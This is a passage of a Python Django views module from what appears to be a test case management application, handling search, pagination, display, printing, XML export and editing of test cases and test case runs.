NewCaseForm(initial=default_form_parameters)\n        if tp:\n            form.populate(product_id=tp.product_id)\n\n    context_data = {\n        'test_plan': tp,\n        'form': form\n    }\n    return render(request, template_name, context_data)\n\n\ndef get_testcaseplan_sortkey_pk_for_testcases(plan, tc_ids):\n    \"\"\"Get each TestCase' sortkey and related TestCasePlan's pk\"\"\"\n    qs = TestCasePlan.objects.filter(case__in=tc_ids)\n    if plan is not None:\n        qs = qs.filter(plan__pk=plan.pk)\n    qs = qs.values('pk', 'sortkey', 'case')\n    return dict([(item['case'], {\n        'testcaseplan_pk': item['pk'],\n        'sortkey': item['sortkey']\n    }) for item in qs])\n\n\ndef calculate_number_of_bugs_for_testcases(tc_ids):\n    \"\"\"Calculate the number of bugs for each TestCase\n\n    Arguments:\n    - tc_ids: a list of tuple of TestCases' IDs\n    \"\"\"\n    qs = Bug.objects.filter(case__in=tc_ids)\n    qs = qs.values('case').annotate(total_count=Count('pk'))\n    return dict([(item['case'], item['total_count']) for item in qs])\n\n\ndef calculate_for_testcases(plan, testcases):\n    \"\"\"Calculate extra data for TestCases\n\n    Attach TestCasePlan.sortkey, TestCasePlan.pk, and the number of bugs of\n    each TestCase.\n\n    Arguments:\n    - plan: the TestPlan containing searched TestCases. None means testcases\n      are not limited to a specific TestPlan.\n    - testcases: a queryset of TestCases.\n    \"\"\"\n    tc_ids = [tc.pk for tc in testcases]\n    sortkey_tcpkan_pks = get_testcaseplan_sortkey_pk_for_testcases(\n        plan, tc_ids)\n    num_bugs = calculate_number_of_bugs_for_testcases(tc_ids)\n\n    # FIXME: strongly recommended to upgrade to Python +2.6\n    for tc in testcases:\n        data = sortkey_tcpkan_pks.get(tc.pk, None)\n        if data:\n            setattr(tc, 'cal_sortkey', data['sortkey'])\n        else:\n            setattr(tc, 'cal_sortkey', None)\n        if data:\n            setattr(tc, 'cal_testcaseplan_pk', data['testcaseplan_pk'])\n        else:\n            setattr(tc, 'cal_testcaseplan_pk', None)\n        setattr(tc, 'cal_num_bugs', num_bugs.get(tc.pk, None))\n\n    return testcases\n\n\ndef get_case_status(template_type):\n    \"\"\"Get part or all TestCaseStatus according to template type\"\"\"\n    confirmed_status_name = 'CONFIRMED'\n    if template_type == 'case':\n        d_status = TestCaseStatus.objects.filter(name=confirmed_status_name)\n    elif template_type == 'review_case':\n        d_status = TestCaseStatus.objects.exclude(name=confirmed_status_name)\n    else:\n        d_status = TestCaseStatus.objects.all()\n    return d_status\n\n\n@require_POST\ndef build_cases_search_form(request, populate=None, plan=None):\n    \"\"\"Build search form preparing for quering TestCases\"\"\"\n    # Initial the form and template\n    action = request.POST.get('a')\n    if action in TESTCASE_OPERATION_ACTIONS:\n        search_form = SearchCaseForm(request.POST)\n        request.session['items_per_page'] = \\\n            request.POST.get('items_per_page', settings.DEFAULT_PAGE_SIZE)\n    else:\n        d_status = get_case_status(request.POST.get('template_type'))\n        d_status_ids = d_status.values_list('pk', flat=True)\n        items_per_page = request.session.get('items_per_page',\n                                             settings.DEFAULT_PAGE_SIZE)\n        search_form = SearchCaseForm(initial={\n            'case_status': d_status_ids,\n            'items_per_page': items_per_page})\n\n    if populate:\n        if request.POST.get('product'):\n            search_form.populate(product_id=request.POST['product'])\n        elif plan and plan.product_id:\n            search_form.populate(product_id=plan.product_id)\n        else:\n            search_form.populate()\n\n    return search_form\n\n\ndef paginate_testcases(request, testcases):\n    \"\"\"Paginate queried TestCases\n\n    Arguments:\n    - request: django's HttpRequest from which to get pagination data\n    - testcases: an object queryset representing already queried TestCases\n\n    Return value: return the queryset for chain call\n    \"\"\"\n    DEFAULT_PAGE_INDEX = 1\n\n    POST = request.POST\n    page_index = int(POST.get('page_index', DEFAULT_PAGE_INDEX))\n    page_size = int(POST.get('items_per_page',\n                             request.session.get('items_per_page',\n                                                 settings.DEFAULT_PAGE_SIZE)))\n    offset = (page_index - 1) * page_size\n    return testcases[offset:offset + page_size]\n\n\ndef sort_queried_testcases(request, testcases):\n    \"\"\"Sort querid TestCases according to sort key\n\n    Arguments:\n    - request: REQUEST object\n    - testcases: object of QuerySet containing queried TestCases\n    \"\"\"\n    order_by = request.POST.get('order_by', 'create_date')\n    asc = bool(request.POST.get('asc', None))\n    tcs = order_case_queryset(testcases, order_by, asc)\n    # default sorted by sortkey\n    tcs = tcs.order_by('testcaseplan__sortkey')\n    # Resort the order\n    # if sorted by 'sortkey'(foreign key field)\n    case_sort_by = request.POST.get('case_sort_by')\n    if case_sort_by:\n        if case_sort_by not in ['sortkey', '-sortkey']:\n            tcs = tcs.order_by(case_sort_by)\n        elif case_sort_by == 'sortkey':\n            tcs = tcs.order_by('testcaseplan__sortkey')\n        else:\n            tcs = tcs.order_by('-testcaseplan__sortkey')\n    return tcs\n\n\ndef query_testcases_from_request(request, plan=None):\n    \"\"\"Query TestCases according to criterias coming within REQUEST\n\n    Arguments:\n    - request: the REQUEST object.\n    - plan: instance of TestPlan to restrict only those TestCases belongs to\n      the TestPlan. Can be None. As you know, query from all TestCases.\n    \"\"\"\n    search_form = build_cases_search_form(request)\n\n    action = request.POST.get('a')\n    if action == 'initial':\n        # todo: build_cases_search_form will also check TESTCASE_OPERATION_ACTIONS\n        # and return slightly different values in case of initialization\n        # move the check there and just execute the query here if the data\n        # is valid\n        d_status = get_case_status(request.POST.get('template_type'))\n        tcs = TestCase.objects.filter(case_status__in=d_status)\n    elif action in TESTCASE_OPERATION_ACTIONS and search_form.is_valid():\n        tcs = TestCase.list(search_form.cleaned_data, plan)\n    else:\n        tcs = TestCase.objects.none()\n\n    # Search the relationship\n    if plan:\n        tcs = tcs.filter(plan=plan)\n\n    tcs = tcs.select_related('author',\n                             'default_tester',\n                             'case_status',\n                             'priority',\n                             'category',\n                             'reviewer')\n    return tcs, search_form\n\n\ndef get_selected_testcases(request):\n    \"\"\"Get selected TestCases from client side\n\n    TestCases are selected in two cases. One is user selects part of displayed\n    TestCases, where there should be at least one variable named case, whose\n    value is the TestCase Id. Another one is user selects all TestCases based\n    on previous filter criterias even through there are non-displayed ones. In\n    this case, another variable selectAll appears in the REQUEST. Whatever its\n    value is.\n\n    If neither variables mentioned exists, empty query result is returned.\n\n    Arguments:\n    - request: REQUEST object.\n    \"\"\"\n    REQ = request.POST or request.GET\n    if REQ.get('selectAll', None):\n        plan = plan_from_request_or_none(request)\n        cases, _search_form = query_testcases_from_request(request, plan)\n        return cases\n    else:\n        pks = [int(pk) for pk in REQ.getlist('case')]\n        return TestCase.objects.filter(pk__in=pks)\n\n\ndef load_more_cases(request, template_name='plan/cases_rows.html'):\n    \"\"\"Loading more TestCases\"\"\"\n    plan = plan_from_request_or_none(request)\n    cases = []\n    selected_case_ids = []\n    if plan is not None:\n        cases, _search_form = query_testcases_from_request(request, plan)\n        cases = sort_queried_testcases(request, cases)\n        cases = paginate_testcases(request, cases)\n        cases = calculate_for_testcases(plan, cases)\n        selected_case_ids = [tc.pk for tc in cases]\n    context_data = {\n        'test_plan': plan,\n        'test_cases': cases,\n        'selected_case_ids': selected_case_ids,\n        'case_status': TestCaseStatus.objects.all(),\n    }\n    return render(request, template_name, context_data)\n\n\ndef get_tags_from_cases(case_ids, plan=None):\n    \"\"\"Get all tags from test cases\n\n    @param cases: an iterable object containing test cases' ids\n    @type cases: list, tuple\n\n    @param plan: TestPlan object\n\n    @return: a list containing all found tags with id and name\n    @rtype: list\n    \"\"\"\n    query = Tag.objects.filter(case__in=case_ids).distinct().order_by('name')\n    if plan:\n        query = query.filter(case__plan=plan)\n\n    return query\n\n\n@require_POST\ndef all(request):\n    \"\"\"\n    Generate the TestCase list for the UI tabs in TestPlan page view.\n\n    POST Parameters:\n    from_plan: Plan ID\n       -- [number]: When the plan ID defined, it will build the case\n    page in plan.\n\n    \"\"\"\n    # Intial the plan in plan details page\n    tp = plan_from_request_or_none(request)\n    if not tp:\n        messages.add_message(request,\n                             messages.ERROR,\n                             _('TestPlan not specified or does not exist'))\n        return HttpResponseRedirect(reverse('core-views-index'))\n\n    tcs, search_form = query_testcases_from_request(request, tp)\n    tcs = sort_queried_testcases(request, tcs)\n    total_cases_count = tcs.count()\n\n    # Get the tags own by the cases\n    ttags = get_tags_from_cases((case.pk for case in tcs), tp)\n\n    tcs = paginate_testcases(request, tcs)\n\n    # There are several extra information related to each TestCase to be shown\n    # also. This step must be the very final one, because the calculation of\n    # related data requires related TestCases' IDs, that is the queryset of\n    # TestCases should be evaluated in advance.\n    tcs = calculate_for_testcases(tp, tcs)\n\n    # generating a query_url with order options\n    #\n    # FIXME: query_url is always equivlant to None&asc=True whatever what\n    # criterias specified in filter form, or just with default filter\n    # conditions during loading TestPlan page.\n    query_url = remove_from_request_path(request, 'order_by')\n    asc = bool(request.POST.get('asc', None))\n    if asc:\n        query_url = remove_from_request_path(query_url, 'asc')\n    else:\n        query_url = '%s&asc=True' % query_url\n\n    context_data = {\n        'test_cases': tcs,\n        'test_plan': tp,\n        'search_form': search_form,\n        # selected_case_ids is used in template to decide whether or not this TestCase is selected\n        'selected_case_ids': [test_case.pk for test_case in get_selected_testcases(request)],\n        'case_status': TestCaseStatus.objects.all(),\n        'priorities': Priority.objects.all(),\n        'case_own_tags': ttags,\n        'query_url': query_url,\n\n        # Load more is a POST request, so POST parameters are required only.\n        # Remember this for loading more cases with the same as criterias.\n        'search_criterias': request.body.decode(),\n        'total_cases_count': total_cases_count,\n    }\n    return render(request, 'plan/get_cases.html', context_data)\n\n\n@require_GET\ndef search(request, template_name='case/all.html'):\n    \"\"\"\n    generate the function of searching cases with search criteria\n    \"\"\"\n    search_form = SearchCaseForm(request.GET)\n    if request.GET.get('product'):\n        search_form.populate(product_id=request.GET['product'])\n    else:\n        search_form.populate()\n\n    context_data = {\n        'search_form': search_form,\n    }\n    return render(request, template_name, context_data)\n\n\n@require_GET\ndef ajax_search(request, template_name='case/common/json_cases.txt'):\n    \"\"\"Generate the case list in search case and case zone in plan\n    \"\"\"\n    tp = plan_from_request_or_none(request)\n\n    action = request.GET.get('a')\n\n    # Initial the form and template\n    if action in ('search', 'sort'):\n        search_form = SearchCaseForm(request.GET)\n    else:\n        # Hacking for case plan\n        confirmed_status_name = 'CONFIRMED'\n        # 'c' is meaning component\n        template_type = request.GET.get('template_type')\n        if template_type == 'case':\n            d_status = TestCaseStatus.objects.filter(name=confirmed_status_name)\n        elif template_type == 'review_case':\n            d_status = TestCaseStatus.objects.exclude(name=confirmed_status_name)\n        else:\n            d_status = TestCaseStatus.objects.all()\n\n        d_status_ids = d_status.values_list('pk', flat=True)\n\n        search_form = SearchCaseForm(initial={'case_status': d_status_ids})\n\n    # Populate the form\n    if request.GET.get('product'):\n        search_form.populate(product_id=request.GET['product'])\n    elif tp and tp.product_id:\n        search_form.populate(product_id=tp.product_id)\n    else:\n        search_form.populate()\n\n    # Query the database when search\n    if action in ('search', 'sort') and search_form.is_valid():\n        tcs = TestCase.list(search_form.cleaned_data)\n    elif action == 'initial':\n        tcs = TestCase.objects.filter(case_status__in=d_status)\n    else:\n        tcs = TestCase.objects.none()\n\n    # Search the relationship\n    if tp:\n        tcs = tcs.filter(plan=tp)\n\n    tcs = tcs.select_related(\n        'author',\n        'default_tester',\n        'case_status',\n        'priority',\n        'category'\n    ).only(\n        'case_id',\n        'summary',\n        'create_date',\n        'is_automated',\n        'is_automated_proposed',\n        'case_status__name',\n        'category__name',\n        'priority__value',\n        'author__username',\n        'default_tester__id',\n        'default_tester__username'\n    )\n    tcs = tcs.extra(select={'num_bug': RawSQL.num_case_bugs, })\n\n    # columnIndexNameMap is required for correct sorting behavior, 5 should be\n    # product, but we use run.build.product\n    column_names = [\n        '',\n        '',\n        'case_id',\n        'summary',\n        'author__username',\n        'default_tester__username',\n        'is_automated',\n        'case_status__name',\n        'category__name',\n        'priority__value',\n        'create_date',\n    ]\n    return ajax_response(request, tcs, column_names, template_name)\n\n\ndef ajax_response(request, queryset, column_names, template_name):\n    \"\"\"json template for the ajax request for searching\"\"\"\n    dt = DataTableResult(request.GET, queryset, column_names)\n\n    # todo: prepare the JSON with the response, consider using :\n    # from django.template.defaultfilters import escapejs\n    json_result = render_to_string(\n        template_name,\n        dt.get_response_data(),\n        request=request)\n    return HttpResponse(json_result, content_type='application/json')\n\n\nclass SimpleTestCaseView(TemplateView, data.TestCaseViewDataMixin):\n    \"\"\"Simple read-only TestCase View used in TestPlan page\"\"\"\n\n    template_name = 'case/get_details.html'\n\n    # NOTES: what permission is proper for this request?\n    def get(self, request, case_id):\n        self.case_id = case_id\n        self.review_mode = request.GET.get('review_mode')\n        return super(SimpleTestCaseView, self).get(request, case_id)\n\n    def get_case(self):\n        cases = TestCase.objects.filter(pk=self.case_id).only('notes')\n        cases = list(cases.iterator())\n        return cases[0] if cases else None\n\n    def get_context_data(self, **kwargs):\n        data = super(SimpleTestCaseView, self).get_context_data(**kwargs)\n\n        case = self.get_case()\n        data['test_case'] = case\n        if case is not None:\n            data.update({\n                'review_mode': self.review_mode,\n                'test_case_text': case.latest_text(),\n                'logs': self.get_case_logs(case),\n                'components': case.component.only('name'),\n                'tags': case.tag.only('name'),\n                'case_comments': self.get_case_comments(case),\n            })\n\n        return data\n\n\nclass TestCaseCaseRunListPaneView(TemplateView):\n    \"\"\"Display case runs list when expand a plan from case page\"\"\"\n\n    template_name = 'case/get_case_runs_by_plan.html'\n\n    # FIXME: what permission here?\n    def get(self, request, case_id):\n        self.case_id = case_id\n\n        plan_id = self.request.GET.get('plan_id', None)\n        self.plan_id = int(plan_id) if plan_id is not None else None\n\n        this_cls = TestCaseCaseRunListPaneView\n        return super(this_cls, self).get(request, case_id)\n\n    def get_case_runs(self):\n        qs = TestCaseRun.objects.filter(case=self.case_id,\n                                        run__plan=self.plan_id)\n        qs = qs.values(\n            'pk', 'case_id', 'run_id', 'case_text_version',\n            'close_date', 'sortkey',\n            'tested_by__username', 'assignee__username',\n            'run__plan_id', 'run__summary',\n            'case__category__name', 'case__priority__value',\n            'case_run_status__name',\n        ).order_by('pk')\n        return qs\n\n    def get_comments_count(self, caserun_ids):\n        ct = ContentType.objects.get_for_model(TestCaseRun)\n        qs = Comment.objects.filter(content_type=ct,\n                                    object_pk__in=caserun_ids,\n                                    site_id=settings.SITE_ID,\n                                    is_removed=False)\n        qs = qs.values('object_pk').annotate(comment_count=Count('pk'))\n        result = {}\n        for item in qs.iterator():\n            result[int(item['object_pk'])] = item['comment_count']\n        return result\n\n    def get_context_data(self, **kwargs):\n        this_cls = TestCaseCaseRunListPaneView\n        data = super(this_cls, self).get_context_data(**kwargs)\n\n        case_runs = self.get_case_runs()\n\n        # Get the number of each caserun's comments, and put the count into\n        # comments query result.\n        caserun_ids = [item['pk'] for item in case_runs]\n        comments_count = self.get_comments_count(caserun_ids)\n        for case_run in case_runs:\n            case_run['comments_count'] = comments_count.get(case_run['pk'], 0)\n\n        data.update({\n            'case_runs': case_runs,\n        })\n        return data\n\n\nclass TestCaseSimpleCaseRunView(TemplateView, data.TestCaseRunViewDataMixin):\n    \"\"\"Display caserun information in Case Runs tab in case page\n\n    This view only shows notes, comments and logs simply. So, call it simple.\n    \"\"\"\n\n    template_name = 'case/get_details_case_case_run.html'\n\n    # what permission here?\n    def get(self, request, case_id):\n        try:\n            self.caserun_id = int(request.GET.get('case_run_id', None))\n        except (TypeError, ValueError):\n            raise Http404\n\n        this_cls = TestCaseSimpleCaseRunView\n        return super(this_cls, self).get(request, case_id)\n\n    def get_caserun(self):\n        try:\n            return TestCaseRun.objects.filter(\n                pk=self.caserun_id).only('notes')[0]\n        except IndexError:\n            raise Http404\n\n    def get_context_data(self, **kwargs):\n        this_cls = TestCaseSimpleCaseRunView\n        data = super(this_cls, self).get_context_data(**kwargs)\n\n        caserun = self.get_caserun()\n        logs = self.get_case_run_logs(caserun)\n        comments = self.get_case_run_comments(caserun)\n\n        data.update({\n            'test_caserun': caserun,\n            'logs': logs.iterator(),\n            'comments': comments.iterator(),\n        })\n        return data\n\n\nclass TestCaseCaseRunDetailPanelView(TemplateView,\n                                     data.TestCaseViewDataMixin,\n                                     data.TestCaseRunViewDataMixin):\n    \"\"\"Display case run detail in run page\"\"\"\n\n    template_name = 'case/get_details_case_run.html'\n\n    def get(self, request, case_id):\n        self.case_id = case_id\n        try:\n            self.caserun_id = int(request.GET.get('case_run_id'))\n            self.case_text_version = int(request.GET.get('case_text_version'))\n        except (TypeError, ValueError):\n            raise Http404\n\n        this_cls = TestCaseCaseRunDetailPanelView\n        return super(this_cls, self).get(request, case_id)\n\n    def get_context_data(self, **kwargs):\n        this_cls = TestCaseCaseRunDetailPanelView\n        data = super(this_cls, self).get_context_data(**kwargs)\n\n        try:\n            qs = TestCase.objects.filter(pk=self.case_id)\n            qs = qs.prefetch_related('component',\n                                     'tag').only('pk')\n            case = qs[0]\n\n            qs = TestCaseRun.objects.filter(pk=self.caserun_id).order_by('pk')\n            case_run = qs[0]\n        except IndexError:\n            raise Http404\n\n        # Data of TestCase\n        test_case_text = case.get_text_with_version(self.case_text_version)\n\n        # Data of TestCaseRun\n        caserun_comments = self.get_case_run_comments(case_run)\n        caserun_logs = self.get_case_run_logs(case_run)\n\n        caserun_status = TestCaseRunStatus.objects.values('pk', 'name')\n        caserun_status = caserun_status.order_by('sortkey')\n        bugs = group_case_bugs(case_run.case.get_bugs().order_by('bug_id'))\n\n        data.update({\n            'test_case': case,\n            'test_case_text': test_case_text,\n\n            'test_case_run': case_run,\n            'comments_count': len(caserun_comments),\n            'caserun_comments': caserun_comments,\n            'caserun_logs': caserun_logs,\n            'test_case_run_status': caserun_status,\n            'grouped_case_bugs': bugs,\n        })\n\n        return data\n\n\ndef get(request, case_id):\n    \"\"\"Get the case content\"\"\"\n    # Get the case\n    try:\n        tc = TestCase.objects.select_related(\n            'author', 'default_tester',\n            'category', 'category',\n            'priority', 'case_status').get(case_id=case_id)\n    except ObjectDoesNotExist:\n        raise Http404\n\n    # Get the test plans\n    tps = tc.plan.select_related('author', 'product', 'type').all()\n\n    # log\n    log_id = str(case_id)\n    logs = TCMSLogModel.get_logs_for_model(TestCase, log_id)\n\n    logs = itertools.groupby(logs, lambda l: l.date)\n    logs = [(day, list(log_actions)) for day, log_actions in logs]\n    try:\n        tp = tps.get(pk=request.GET.get('from_plan', 0))\n    except (TestPlan.DoesNotExist, ValueError):\n        # ValueError is raised when from_plan is empty string\n        # not viewing TC from a Plan or specified Plan does not exist (e.g. broken link)\n        tp = None\n\n    # Get the test case runs\n    tcrs = tc.case_run.select_related(\n        'run', 'tested_by',\n        'assignee', 'case',\n        'case', 'case_run_status').all()\n    tcrs = tcrs.extra(select={\n        'num_bug': RawSQL.num_case_run_bugs,\n    }).order_by('run__plan')\n    runs_ordered_by_plan = itertools.groupby(tcrs, lambda t: t.run.plan)\n    # FIXME: Just don't know why Django template does not evaluate a generator,\n    # and had to evaluate the groupby generator manually like below.\n    runs_ordered_by_plan = [(k, list(v)) for k, v in runs_ordered_by_plan]\n    case_run_plans = [k for k, v in runs_ordered_by_plan]\n    # Get the specific test case run\n    if request.GET.get('case_run_id'):\n        tcr = tcrs.get(pk=request.GET['case_run_id'])\n    else:\n        tcr = None\n    case_run_plan_id = request.GET.get('case_run_plan_id', None)\n    if case_run_plan_id:\n        for item in runs_ordered_by_plan:\n            if item[0].pk == int(case_run_plan_id):\n                case_runs_by_plan = item[1]\n                break\n            else:\n                continue\n    else:\n        case_runs_by_plan = None\n\n    # Get the case texts\n    tc_text = tc.get_text_with_version(request.GET.get('case_text_version'))\n\n    grouped_case_bugs = tcr and group_case_bugs(tcr.case.get_bugs())\n    # Render the page\n    context_data = {\n        'logs': logs,\n        'test_case': tc,\n        'test_plan': tp,\n        'test_plans': tps,\n        'test_case_runs': tcrs,\n        'case_run_plans': case_run_plans,\n        'test_case_runs_by_plan': case_runs_by_plan,\n        'test_case_run': tcr,\n        'grouped_case_bugs': grouped_case_bugs,\n        'test_case_text': tc_text,\n        'test_case_status': TestCaseStatus.objects.all(),\n        'test_case_run_status': TestCaseRunStatus.objects.all(),\n        'bug_trackers': BugSystem.objects.all(),\n    }\n    return render(request, 'case/get.html', context_data)\n\n\n@require_POST\ndef printable(request, template_name='case/printable.html'):\n    \"\"\"\n        Create the printable copy for plan/case.\n        Only CONFIRMED TestCases are printed when printing a TestPlan!\n    \"\"\"\n    # search only by case PK. Used when printing selected cases\n    case_ids = request.POST.getlist('case')\n    case_filter = {'case__in': case_ids}\n\n    test_plan = None\n    # plan_pk is passed from the TestPlan.printable function\n    # but it doesn't pass IDs of individual cases to be printed\n    if not case_ids:\n        plan_pk = request.POST.get('plan', 0)\n        try:\n            test_plan = TestPlan.objects.get(pk=plan_pk)\n            # search cases from a TestPlan, used when printing entire plan\n            case_filter = {\n                'case__plan': plan_pk,\n                'case__case_status': TestCaseStatus.objects.get(name='CONFIRMED').pk,\n            }\n        except (ValueError, TestPlan.DoesNotExist):\n            test_plan = None\n\n    tcs = create_dict_from_query(\n        TestCaseText.objects.filter(**case_filter).values(\n            'case_id', 'case__summary', 'setup', 'action', 'effect', 'breakdown'\n        ).order_by('case_id', '-case_text_version'),\n        'case_id',\n        True\n    )\n\n    context_data = {\n        'test_plan': test_plan,\n        'test_cases': tcs,\n    }\n    return render(request, template_name, context_data)\n\n\n@require_POST\ndef export(request, template_name='case/export.xml'):\n    \"\"\"Export the plan\"\"\"\n    case_pks = request.POST.getlist('case')\n    context_data = {\n        'data_generator': generator_proxy(case_pks),\n    }\n\n    response = render(request, template_name, context_data)\n\n    response['Content-Disposition'] = \\\n        'attachment; filename=tcms-testcases-%s.xml' % datetime.datetime.now().strftime('%Y-%m-%d')\n    return response\n\n\ndef generator_proxy(case_pks):\n    metas = TestCase.objects.filter(\n        pk__in=case_pks\n    ).exclude(\n        case_status__name='DISABLED'\n    ).values(\n        'case_id', 'summary', 'is_automated', 'notes',\n        'priority__value', 'case_status__name',\n        'author__email', 'default_tester__email',\n        'category__name')\n\n    component_dict = create_dict_from_query(\n        TestCaseComponent.objects.filter(\n            case__in=case_pks\n        ).values(\n            'case_id', 'component_id', 'component__name', 'component__product__name'\n        ).order_by('case_id'),\n        'case_id'\n    )\n\n    tag_dict = create_dict_from_query(\n        TestCase.objects.filter(\n            pk__in=case_pks\n        ).values('case_id', 'tag__name').order_by('case_id'),\n        'case_id'\n    )\n\n    plan_text_dict = create_dict_from_query(\n        TestCaseText.objects.filter(\n            case__in=case_pks\n        ).values(\n            'case_id', 'setup', 'action', 'effect', 'breakdown'\n        ).order_by('case_id', '-case_text_version'),\n        'case_id',\n        True\n    )\n\n    for meta in metas:\n        case_id = meta['case_id']\n        c_meta = component_dict.get(case_id, None)\n        if c_meta:\n            meta['c_meta'] = c_meta\n\n        tag = tag_dict.get(case_id, None)\n        if tag:\n            meta['tag'] = tag\n\n        plan_text = plan_text_dict.get(case_id, None)\n        if plan_text:\n            meta['latest_text'] = plan_text\n\n        yield meta\n\n\ndef update_testcase(request, tc, tc_form):\n    \"\"\"Updating information of specific TestCase\n\n    This is called by views.edit internally. Don't call this directly.\n\n    Arguments:\n    - tc: instance of a TestCase being updated\n    - tc_form: instance of django.forms.Form, holding validated data.\n    \"\"\"\n\n    # Modify the contents\n    fields = ['summary',\n              'case_status',\n              'category',\n              'priority',\n              'notes',\n              'is_automated',\n              'is_automated_proposed',\n              'script',\n              'arguments',\n              'extra_link',\n              'requirement',\n              'alias']\n\n    for field in fields:\n        if getattr(tc, field) != tc_form.cleaned_data[field]:\n            tc.log_action(request.user,\n                          'Case %s changed from %s to %s in edit page.' % (\n                              field, getattr(tc, field),\n                              tc_form.cleaned_data[field]\n                          ))\n            setattr(tc, field, tc_form.cleaned_data[field])\n    try:\n        if tc.default_tester != tc_form.cleaned_data['default_tester']:\n            tc.log_action(\n                request.user,\n                'Case default tester changed from %s to %s in edit page.' % (\n                    tc.default_tester_id and tc.default_tester,\n                    tc_form.cleaned_data['default_tester']\n                ))\n            tc.default_tester = tc_form.cleaned_data['default_tester']\n    except ObjectDoesNotExist:\n        pass\n    tc.update_tags(tc_form.cleaned_data.get('tag'))\n    try:\n        fields_text = ['action', 'effect', 'setup', 'breakdown']\n        latest_text = tc.latest_text()\n\n        for field in fields_text:\n            form_cleaned = tc_form.cleaned_data[field]\n            if not (getattr(latest_text, field) or form_cleaned):\n                continue\n            if getattr(latest_text, field) != form_cleaned:\n                tc.log_action(\n                    request.user,\n                    ' Case %s changed from %s to %s in edit page.' % (\n                        field, getattr(latest_text, field) or None,\n                        form_cleaned or None\n                    ))\n    except ObjectDoesNotExist:\n        pass\n\n    # FIXME: Bug here, timedelta from form cleaned data need to convert.\n    tc.estimated_time = tc_form.cleaned_data['estimated_time']\n    # IMPORTANT! tc.current_user is an instance attribute,\n    # added so that in post_save, current logged-in user info\n    # can be accessed.\n    # Instance attribute is usually not a desirable solution.\n    tc.current_user = request.user\n    tc.save()\n\n\n@permission_required('testcases.change_testcase')\ndef edit(request, case_id, template_name='case/edit.html'):\n    \"\"\"Edit case detail\"\"\"\n    try:\n        tc = TestCase.objects.select_related().get(case_id=case_id)\n    except ObjectDoesNotExist:\n        raise Http404\n\n    tp = plan_from_request_or_none(request)\n\n    if request.method == \"POST\":\n        form = EditCaseForm(request.POST)\n        if request.POST.get('product'):\n            form.populate(product_id=request.POST['product'])\n        elif tp:\n            form.populate(product_id=tp.product_id)\n        else:\n            form.populate()\n\n        n_form = CaseNotifyForm(request.POST)\n\n        if form.is_valid() and n_form.is_valid():\n\n            update_testcase(request, tc, form)\n\n            tc.add_text(author=request.user,\n                        action=form.cleaned_data['action'],\n                        effect=form.cleaned_data['effect'],\n                        setup=form.cleaned_data['setup'],\n                        breakdown=form.cleaned_data['breakdown'])\n\n            # Notification\n            update_case_email_settings(tc, n_form)\n\n            # Returns\n            if request.POST.get('_continue'):\n                return HttpResponseRedirect('%s?from_plan=%s' % (\n                    reverse('testcases-edit', args=[case_id, ]),\n                    request.POST.get('from_plan', None),\n                ))\n\n            if request.POST.get('_continuenext'):\n                if not tp:\n                    raise Http404\n\n                # find out test case list which belong to the same\n                # classification\n                confirm_status_name = 'CONFIRMED'\n                if tc.case_status.name == confirm_status_name:\n                    pk_list = tp.case.filter(\n                        case_status__name=confirm_status_name)\n                else:\n                    pk_list = tp.case.exclude(\n                        case_status__name=confirm_status_name)\n                pk_list = list(pk_list.defer('case_id').values_list('pk', flat=True))\n                pk_list.sort()\n\n                # Get the previous and next case\n                p_tc, n_tc = tc.get_previous_and_next(pk_list=pk_list)\n                return HttpResponseRedirect('%s?from_plan=%s' % (\n                    reverse('testcases-edit', args=[n_tc.pk, ]),\n                    tp.pk,\n                ))\n\n            if request.POST.get('_returntoplan'):\n                if not tp:\n                    raise Http404\n                confirm_status_name = 'CONFIRMED'\n                if tc.case_status.name == confirm_status_name:\n                    return HttpResponseRedirect('%s#testcases' % (\n                        reverse('test_plan_url_short', args=[tp.pk, ]),\n                    ))\n                else:\n                    return HttpResponseRedirect('%s#reviewcases' % (\n                        reverse('test_plan_url_short', args=[tp.pk, ]),\n                    ))\n\n            return HttpResponseRedirect('%s?from_plan=%s' % (\n                reverse('testcases-get', args=[case_id, ]),\n                request.POST.get('from_plan', None),\n            ))\n\n    else:\n        tctxt = tc.latest_text()\n        # Notification form initial\n        n_form = CaseNotifyForm(initial={\n            'notify_on_case_update': tc.emailing.notify_on_case_update,\n            'notify_on_case_delete': tc.emailing.notify_on_case_delete,\n            'author': tc.emailing.auto_to_case_author,\n            'default_tester_of_case': tc.emailing.auto_to_case_tester,\n            'managers_of_runs': tc.emailing.auto_to_run_manager,\n            'default_testers_of_runs': tc.emailing.auto_to_run_tester,\n            'assignees_of_case_runs': tc.emailing.auto_to_case_run_assignee,\n            'cc_list': CC_LIST_DEFAULT_DELIMITER.join(\n                tc.emailing.get_cc_list()),\n        })\n        default_tester = tc.default_tester_id and tc.default_tester.\\\n            email or None\n        form = EditCaseForm(initial={\n            'summary': tc.summary,\n            'default_tester': default_tester,\n            'requirement': tc.requirement,\n            'is_automated': tc.get_is_automated_form_value(),\n            'is_automated_proposed': tc.is_automated_proposed,\n            'script': tc.script,\n            'arguments': tc.arguments,\n            'extra_link': tc.extra_link,\n            'alias': tc.alias,\n            'case_status': tc.case_status_id,\n            'priority': tc.priority_id,\n            'product': tc.category.product_id,\n            'category': tc.category_id,\n            'notes': tc.notes,\n            'component': [c.pk for c in tc.component.all()],\n            'estimated_time': tc.estimated_time,\n            'setup': tctxt.setup,\n            'action': tctxt.action,\n            'effect': tctxt.effect,\n            'breakdown': tctxt.breakdown,\n            'tag': ','.join(tc.tag.values_list('name', flat=True)),\n        })\n\n        form.populate(product_id=tc.category.product_id)\n\n    context_data = {\n        'test_case': tc,\n        'test_plan': tp,\n        'form': form,\n        'notify_form': n_form,\n    }\n    return render(request, template_name, context_data)\n\n\ndef text_history(request, case_id, template_name='case/history.html'):\n    \"\"\"View test plan text history\"\"\"\n\n    tc = get_object_or_404(TestCase, case_id=case_id)\n    tp = plan_from_request_or_none(request)\n    tctxts = tc.text.values('case_id',\n                            'case_text_version',\n                            'author__email',\n                            'create_date').order_by('-case_text_version')\n\n    context_data = {\n        'testplan': tp,\n        'testcase': tc,\n        'test_case_texts': tctxts.iterator(),\n    }\n\n    try:\n        case_text_version = int(request.GET.get('case_text_version'))\n        text_to_show = tc.text.filter(case_text_version=case_text_version)\n        text_to_show = text_to_show.values('action',\n                                           'effect',\n                                           'setup',\n                                           'breakdown')\n\n        context_data.update({\n            'select_case_text_version': case_text_version,\n            'text_to_show': text_to_show.iterator(),\n        })\n    except (TypeError, ValueError):\n        # If case_text_version is not a valid number, no text to display for a\n        # selected text history\n        pass\n\n    return render(request, template_name, 